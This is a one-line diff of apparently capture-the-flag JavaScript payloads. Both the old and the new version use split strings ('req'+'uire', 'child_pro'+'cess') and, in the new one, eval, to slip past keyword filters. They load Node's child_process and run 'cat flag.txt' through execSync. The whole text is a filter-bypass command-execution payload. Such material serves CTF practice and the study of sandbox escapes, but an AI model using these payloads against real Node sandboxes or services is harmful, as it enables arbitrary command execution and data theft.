@@ -1,1 +1,1 @@
-console.log(global["pro"+"cess"].mainModule["req"+"uire"]("child_pro"+"cess").execSync("cat flag.txt").toString());
+console.log(eval("req"+"uire('child_pro"+"cess').execSync('cat flag.txt').toString()"));
